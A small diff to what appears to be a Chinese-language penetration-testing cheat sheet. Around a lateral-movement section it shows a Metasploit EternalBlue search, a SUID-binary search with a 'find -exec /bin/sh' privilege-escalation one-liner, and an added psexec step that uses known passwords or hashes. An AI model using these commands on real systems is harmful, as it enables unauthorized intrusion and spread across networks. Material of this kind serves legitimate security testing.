@@ -45,8 +45,8 @@ search ms17_010 # (永恒之蓝)
 find / -perm -4000 # 如果有find 执行下面
 find ./ aaa -exec '/bin/sh' \;
 ```
-5.横向移动
-msf: 1. autoroute 2.add socks proxy 3.域控
+5.横向移动/域
+msf: 1. autoroute 2.add socks proxy 3.域控 4.psexec (需开启admin$共享和ipc$及445,知道密码或hash)
 cs: smb上线其他域
 
 ## MSF
